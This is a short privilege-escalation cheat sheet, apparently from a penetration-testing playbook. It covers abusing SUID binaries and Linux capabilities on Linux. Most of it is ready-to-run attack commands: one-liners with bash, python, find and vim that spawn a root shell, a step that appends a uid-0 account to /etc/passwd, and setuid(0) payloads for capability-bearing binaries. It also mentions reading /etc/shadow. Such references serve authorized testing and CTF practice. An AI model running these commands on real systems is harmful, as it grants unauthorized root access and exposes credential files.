---
id: linux-suid-caps
title: Linux SUID / Capabilities
stage: privesc
tags: [linux]
tools:
  - find / -perm -4000 -type f 2>/dev/null
  - getcap -r / 2>/dev/null
leads_to:
  - root-linux
---

## Find SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
```

## Common Exploitable SUIDs (GTFOBins)

```bash
# bash (should not be SUID but sometimes is)
/bin/bash -p

# python
python -c 'import os; os.execl("/bin/sh","sh","-p")'
python3 -c 'import os; os.execl("/bin/sh","sh","-p")'

# cp (overwrite /etc/passwd)
openssl passwd -1 -salt abc password123
echo 'newroot:$1$abc$HASH:0:0:root:/root:/bin/bash' | tee -a /etc/passwd
su newroot

# find
find . -exec /bin/sh -p \; -quit

# vim
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

## Find Capabilities

```bash
getcap -r / 2>/dev/null
```

## Common Exploitable Capabilities

| Capability | Exploit |
|---|---|
| `cap_setuid+ep` | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `cap_dac_read_search+ep` | Read /etc/shadow without root |
| `cap_net_raw+ep` | Packet sniffing |

```bash
# cap_setuid example (path varies — use the actual binary path from getcap)
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# vim with cap_setuid
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh")'
```

## Notes

Always cross-reference any SUID/capability binary against GTFOBins before assuming it's safe. Non-standard binaries in SUID list (anything not typically expected there) are high-priority targets.
